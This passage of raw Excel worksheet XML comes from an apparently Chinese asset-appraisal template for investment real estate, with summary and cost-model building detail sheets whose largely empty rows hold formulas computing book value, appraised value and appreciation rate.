      <c r="E16" s="380" t="n"/>
      <c r="F16" s="578" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-H16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(H16=0,"",K16/H16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="578" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-H17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(H17=0,"",K17/H17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="578" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-H18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(H18=0,"",K18/H18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="578" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-H19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(H19=0,"",K19/H19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="578" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-H20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(H20=0,"",K20/H20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="578" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-H21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(H21=0,"",K21/H21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="578" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-H22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(H22=0,"",K22/H22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="578" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-H23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(H23=0,"",K23/H23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="578" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-H24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(H24=0,"",K24/H24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="578" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-H25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(H25=0,"",K25/H25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="578" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-H26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(H26=0,"",K26/H26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="578" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-H27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(H27=0,"",K27/H27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="578" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-H28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(H28=0,"",K28/H28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="578" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555">
        <f>J29-H29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(H29=0,"",K29/H29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="380" t="n"/>
      <c r="E30" s="380" t="n"/>
      <c r="F30" s="578" t="n"/>
      <c r="G30" s="555" t="n"/>
      <c r="H30" s="555" t="n"/>
      <c r="I30" s="555" t="n"/>
      <c r="J30" s="555" t="n"/>
      <c r="K30" s="555">
        <f>J30-H30</f>
        <v/>
      </c>
      <c r="L30" s="555">
        <f>IF(H30=0,"",K30/H30*100)</f>
        <v/>
      </c>
      <c r="M30" s="383" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B31" s="380" t="inlineStr">
        <is>
          <t>合          计</t>
        </is>
      </c>
      <c r="C31" s="567" t="n"/>
      <c r="D31" s="383" t="n"/>
      <c r="E31" s="115" t="n"/>
      <c r="F31" s="383" t="n"/>
      <c r="G31" s="555">
        <f>ROUND(SUM(G6:G30),2)</f>
        <v/>
      </c>
      <c r="H31" s="555">
        <f>ROUND(SUM(H6:H30),2)</f>
        <v/>
      </c>
      <c r="I31" s="555" t="n"/>
      <c r="J31" s="555">
        <f>ROUND(SUM(J6:J30),2)</f>
        <v/>
      </c>
      <c r="K31" s="555">
        <f>J31-H31</f>
        <v/>
      </c>
      <c r="L31" s="555">
        <f>IF(H31=0,"",K31/H31*100)</f>
        <v/>
      </c>
      <c r="M31" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="L3:M3"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B31:C31"/>
    <mergeCell ref="B1:M1"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M31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2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 codeName="Sheet50">
    <tabColor rgb="FF00B050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:H21"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="130" zoomScaleNormal="90" workbookViewId="0">
      <selection activeCell="J15" sqref="J15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="8.66666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="33.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="22" customWidth="1" style="410" min="5" max="5"/>
    <col width="20.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="16.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>投资性房地产评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customHeight="1" s="415">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18" customHeight="1" s="415">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="373" t="n"/>
      <c r="G3" s="376" t="n"/>
      <c r="H3" s="402" t="inlineStr">
        <is>
          <t>表4-7</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customHeight="1" s="415">
      <c r="B4" s="549">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="549" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="253" t="n"/>
      <c r="H4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="284" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="284" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="323" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
    </row>
    <row r="6" ht="18" customHeight="1" s="415">
      <c r="B6" s="198" t="inlineStr">
        <is>
          <t>4-7-1</t>
        </is>
      </c>
      <c r="C6" s="255" t="inlineStr">
        <is>
          <t>投房房成</t>
        </is>
      </c>
      <c r="D6" s="258" t="inlineStr">
        <is>
          <t>投资性房地产——房屋(成本)</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'4-7-1投资性房地产'!L29</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'4-7-1投资性房地产'!O29</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",ROUND(G6/E6*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="7" ht="18" customHeight="1" s="415">
      <c r="B7" s="198" t="inlineStr">
        <is>
          <t>4-7-2</t>
        </is>
      </c>
      <c r="C7" s="255" t="inlineStr">
        <is>
          <t>投房房公</t>
        </is>
      </c>
      <c r="D7" s="258" t="inlineStr">
        <is>
          <t>投资性房地产——房屋(公允)</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'4-7-2投资性房地产'!L26</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'4-7-2投资性房地产'!M26</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",ROUND(G7/E7*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="18" customHeight="1" s="415">
      <c r="B8" s="198" t="inlineStr">
        <is>
          <t>4-7-3</t>
        </is>
      </c>
      <c r="C8" s="255" t="inlineStr">
        <is>
          <t>投房土成</t>
        </is>
      </c>
      <c r="D8" s="258" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权(成本)</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'4-7-3投资性地产'!N29</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-7-3投资性地产'!O29</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",ROUND(G8/E8*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="B9" s="198" t="inlineStr">
        <is>
          <t>4-7-4</t>
        </is>
      </c>
      <c r="C9" s="255" t="inlineStr">
        <is>
          <t>投房土公</t>
        </is>
      </c>
      <c r="D9" s="258" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权(公允)</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'4-7-4投资性地产'!N29</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'4-7-4投资性地产'!O29</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",ROUND(G9/E9*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
      <c r="B10" s="198" t="n"/>
      <c r="C10" s="182" t="n"/>
      <c r="D10" s="327" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="B11" s="198" t="n"/>
      <c r="C11" s="182" t="n"/>
      <c r="D11" s="254" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="B12" s="198" t="n"/>
      <c r="C12" s="182" t="n"/>
      <c r="D12" s="254" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
    </row>
    <row r="13" ht="18" customHeight="1" s="415">
      <c r="B13" s="198" t="n"/>
      <c r="C13" s="182" t="n"/>
      <c r="D13" s="254" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="B14" s="198" t="n"/>
      <c r="C14" s="182" t="n"/>
      <c r="D14" s="254" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="B15" s="198" t="n"/>
      <c r="C15" s="182" t="n"/>
      <c r="D15" s="395" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="B16" s="198" t="n"/>
      <c r="C16" s="182" t="n"/>
      <c r="D16" s="254" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="B17" s="198" t="n"/>
      <c r="C17" s="182" t="n"/>
      <c r="D17" s="258" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="B18" s="198" t="n"/>
      <c r="C18" s="182" t="n"/>
      <c r="D18" s="254" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555">
        <f>IF(E18=0,"",ROUND(G18/E18*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="B19" s="200" t="n"/>
      <c r="C19" s="281" t="inlineStr">
        <is>
          <t>投房汇总</t>
        </is>
      </c>
      <c r="D19" s="282" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="B20" s="145" t="n"/>
      <c r="C20" s="202" t="inlineStr">
        <is>
          <t>投房准备</t>
        </is>
      </c>
      <c r="D20" s="323" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="A21" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B21" s="201" t="n"/>
      <c r="C21" s="281" t="inlineStr">
        <is>
          <t>投房净额</t>
        </is>
      </c>
      <c r="D21" s="283" t="inlineStr">
        <is>
          <t>投资性房地产合计</t>
        </is>
      </c>
      <c r="E21" s="555">
        <f>SUM(E6:E20)</f>
        <v/>
      </c>
      <c r="F21" s="555">
        <f>SUM(F6:F20)</f>
        <v/>
      </c>
      <c r="G21" s="555">
        <f>F21-E21</f>
        <v/>
      </c>
      <c r="H21" s="555">
        <f>IF(E21=0,"",ROUND(G21/E21*100,2))</f>
        <v/>
      </c>
    </row>
  </sheetData>
  <mergeCells count="2">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
  </mergeCells>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.972222222222222" header="0.3" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet54.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet51">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:R31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="B27" sqref="B27:D28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="8" customWidth="1" style="410" min="2" max="2"/>
    <col width="10.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="9.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col width="9.5" customWidth="1" style="410" min="10" max="10"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="7.83333333333333" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col outlineLevel="1" width="8.33333333333333" customWidth="1" style="410" min="16" max="16"/>
    <col outlineLevel="1" width="8.83333333333333" customWidth="1" style="410" min="17" max="17"/>
    <col width="6" customWidth="1" style="410" min="18" max="18"/>
    <col width="9" customWidth="1" style="410" min="19" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>投资性房地产——房屋评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="21.75" customFormat="1" customHeight="1" s="368">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="261" t="inlineStr">
        <is>
          <t>（采用成本模式计量）</t>
        </is>
      </c>
    </row>
    <row r="3" ht="16.5" customHeight="1" s="415">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="376" t="n"/>
      <c r="C4" s="376" t="n"/>
      <c r="D4" s="376" t="n"/>
      <c r="E4" s="376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="547" t="n"/>
      <c r="I4" s="547" t="n"/>
      <c r="J4" s="547" t="n"/>
      <c r="K4" s="547" t="n"/>
      <c r="L4" s="547" t="n"/>
      <c r="M4" s="547" t="n"/>
      <c r="N4" s="547" t="n"/>
      <c r="O4" s="547" t="n"/>
      <c r="P4" s="548" t="inlineStr">
        <is>
          <t>表4-7</t>
        </is>
      </c>
    </row>
    <row r="5" ht="16.5" customHeight="1" s="415">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B5" s="598">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="H5" s="347" t="n"/>
      <c r="I5" s="347" t="n"/>
      <c r="J5" s="347" t="n"/>
      <c r="K5" s="347" t="n"/>
      <c r="L5" s="347" t="n"/>
      <c r="M5" s="347" t="n"/>
      <c r="N5" s="347" t="n"/>
      <c r="O5" s="347" t="n"/>
      <c r="P5" s="176" t="n"/>
      <c r="Q5" s="176" t="n"/>
      <c r="R5" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B6" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C6" s="177" t="inlineStr">
        <is>
          <t>权证编号</t>
        </is>
      </c>
      <c r="D6" s="177" t="inlineStr">
        <is>
          <t>房屋名称</t>
        </is>
      </c>
      <c r="E6" s="264" t="inlineStr">
        <is>
          <t>来源</t>
        </is>
      </c>
      <c r="F6" s="177" t="inlineStr">
        <is>
          <t>结构</t>
        </is>
      </c>
      <c r="G6" s="177" t="inlineStr">
        <is>
          <t>建成
年月</t>
        </is>
      </c>
      <c r="H6" s="599" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="I6" s="599" t="inlineStr">
        <is>
          <t>建筑面积</t>
        </is>
      </c>
      <c r="J6" s="177" t="inlineStr">
        <is>
          <t>成本单价(元/m2)</t>
        </is>
      </c>
      <c r="K6" s="177" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="L6" s="567" t="n"/>
      <c r="M6" s="177" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N6" s="593" t="n"/>
      <c r="O6" s="567" t="n"/>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q6" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R6" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="7" ht="18" customFormat="1" customHeight="1" s="204">
      <c r="A7" s="116" t="inlineStr">
        <is>
          <t>检索表头2</t>
        </is>
      </c>
      <c r="B7" s="594" t="n"/>
      <c r="C7" s="594" t="n"/>
      <c r="D7" s="594" t="n"/>
      <c r="E7" s="594" t="n"/>
      <c r="F7" s="594" t="n"/>
      <c r="G7" s="594" t="n"/>
      <c r="H7" s="594" t="n"/>
      <c r="I7" s="594" t="n"/>
      <c r="J7" s="594" t="n"/>
      <c r="K7" s="178" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L7" s="177" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="M7" s="177" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="N7" s="177" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="O7" s="177" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="P7" s="594" t="n"/>
      <c r="Q7" s="594" t="n"/>
      <c r="R7" s="594" t="n"/>
    </row>
    <row r="8" ht="18" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="587" t="n"/>
      <c r="H8" s="284" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="inlineStr"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="552" t="n"/>
      <c r="O8" s="555">
        <f>ROUND(M8*N8/100,-2)</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>O8-L8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(L8=0,"",P8/L8*100)</f>
        <v/>
      </c>
      <c r="R8" s="243" t="n"/>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="587" t="n"/>
      <c r="H9" s="284" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="inlineStr"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="552" t="n"/>
      <c r="O9" s="555">
        <f>ROUND(M9*N9/100,-2)</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>O9-L9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(L9=0,"",P9/L9*100)</f>
        <v/>
      </c>
      <c r="R9" s="243" t="n"/>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
